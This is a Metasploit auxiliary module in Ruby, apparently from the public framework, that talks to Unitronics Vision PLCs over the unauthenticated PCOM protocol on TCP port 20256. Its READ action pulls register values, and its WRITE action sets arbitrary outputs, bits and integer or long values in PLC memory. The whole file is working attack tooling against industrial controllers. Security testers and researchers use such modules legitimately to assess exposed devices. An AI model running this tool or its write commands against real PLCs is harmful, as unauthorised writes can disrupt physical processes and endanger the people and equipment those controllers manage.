##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Unitronics PCOM Client',
      'Description'   => %q{
        Unitronics Vision PLCs allow unauthenticated PCOM commands
        to query PLC registers.
      },
      'Author'         => [ 'Luis Rosa <lmrosa[at]dei.uc.pt>' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'https://unitronicsplc.com/Download/SoftwareUtilities/Unitronics%20PCOM%20Protocol.pdf' ]
        ],
      'Actions'        =>
        [
          ['READ', { 'Description' => 'Read values from PLC memory' } ],
          ['WRITE', { 'Description' => 'Write values to PLC memory' } ]
        ],
      'DefaultAction' => 'READ'
    ))

    register_options(
      [
        Opt::RPORT(20256),
        OptInt.new('UNITID', [ false, 'Unit ID (0 - 127)', 0]),
        OptInt.new('ADDRESS', [true, "PCOM memory address (0 - 65535)", 0]),
        OptInt.new('LENGTH', [true, "Number of values to read (1 - 255) (read only)", 3]),
        OptString.new('VALUES', [false, "Values to write (0 - 65535 each) (comma separated) (write only)"]),
        OptEnum.new("OPERAND", [true, 'Operand type', "MI", ["Input", "Output", "SB", "MB", "MI", "SI", "ML", "SL", "SDW","MDW"]])
      ])
  end

  # compute and return the checksum of a PCOM ASCII message
  def pcom_ascii_checksum(msg)
    (msg.each_byte.inject(:+) % 256 ).to_s(16).upcase.rjust(2, '0')
  end

  # compute and return the pcom length
  def pcom_ascii_len(pcom_ascii)
    Rex::Text.hex_to_raw(pcom_ascii.length.to_s(16).rjust(4,'0').unpack('H4H4').reverse.pack('H4H4'))
  end

  # return a pcom ascii formatted request
  def pcom_ascii_request(command)
    unit_id = datastore['UNITID'].to_s(16).rjust(2,'0')
    # PCOM/ASCII
    pcom_ascii_payload = "" +
      "\x2f" + # '/'
      unit_id +
      command +
      pcom_ascii_checksum(unit_id + command) + # checksum
      "\x0d" # '\r'

    # PCOM/TCP header
    Rex::Text.rand_text_hex(2) + # transaction id
      "\x65" + # ascii (101)
      "\x00" + # reserved
      pcom_ascii_len(pcom_ascii_payload) + # length
      pcom_ascii_payload
  end

  def read
    if datastore['LENGTH'] + datastore['ADDRESS'] > 65535
      print_error("Invalid ADDRESS")
      return
    end

    case datastore['OPERAND']
    when "Input"
      cc = "RE"
    when "Output"
      cc = "RA"
    when "SB"
      cc = "GS"
    when "MB"
      cc = "RB"
    when "MI"
      cc = "RW"
    when "SI"
      cc = "GF"
    when "ML"
      cc = "RNL"
    when "SL"
      cc = "RNH"
    when "SDW"
      cc = "RNJ"
    when "MDW"
      cc = "RND"
    else
      print_error("Unknown operand #{datastore['OPERAND']}")
      return
    end

    address = datastore['ADDRESS'].to_s(16).rjust(4,'0')
    length = datastore['LENGTH'].to_s(16).rjust(2,'0')
    print_status("Reading #{length} values (#{datastore['OPERAND']}) starting from #{address} address")
    sock.put(pcom_ascii_request(cc + address + length))
    sock.get_once
  end

  def print_read_ans(ans)
    cc = ans[0..1]
    data = ans[2..ans.length]
    start_addr = datastore['ADDRESS']
    case cc
    when "RE"
      size = 1
    when "RA"
      size = 1
    when "RB"
      size = 1
    when "GS"
      size = 1
    when "RW"
      size = 4
    when "GF"
      size = 4
    when "RN"
      size = 8
    else
      print_error("Unknown answer #{cc}")
      return
    end
    data.scan(/.{#{size}}/).each_with_index {|val, i|
      print_good("[#{(start_addr + i).to_s.rjust(5,'0')}] : #{val.to_i(16)}")}
  end

  def write
    values = datastore['VALUES'].split(",")
    case datastore['OPERAND']
    when "Input"
      print_error("Input operand is read only")
      return
    when "Output"
      cc = "SA"
    when "SB"
      cc = "SS"
    when "MB"
      cc = "SB"
    when "MI"
      cc = "SW"
    when "SI"
      cc = "SF"
    when "ML"
      cc = "SNL"
    when "SL"
      cc = "SNH"
    when "SDW"
      cc = "SDJ"
    when "MDW"
      cc = "SND"
    else
      print_error("Unknown operand #{datastore['OPERAND']}")
      return
    end

    address = datastore['ADDRESS'].to_s(16).rjust(4,'0')
    length = values.length.to_s(16).rjust(2,'0')
    values_to_write = values.map{|s| s.to_i(10).to_s(16).rjust(4,'0')}.join
    print_status("Writing #{length} #{datastore['OPERAND']} (#{datastore['VALUES']}) starting from #{address} address")
    sock.put(pcom_ascii_request(cc + address + length + values_to_write))
    sock.get_once
  end

  def run
    connect
    case action.name
    when "READ"
      if datastore['LENGTH'] == nil
        print_error("The option VALUES is not set")
        return
      else
        ans = read
        if ans == nil
          print_error("No answer from PLC")
          return
        end
        print_read_ans(ans.to_s[10..(ans.length-4)])
      end
    when "WRITE"
      if datastore['VALUES'] == nil
        print_error("The option VALUES is not set")
        return
      else
        ans = write
        if ans == nil
          print_error("No answer from PLC")
          return
        end
      end
    else
      print_error("Unknown action #{action.name}")
    end
  end
end
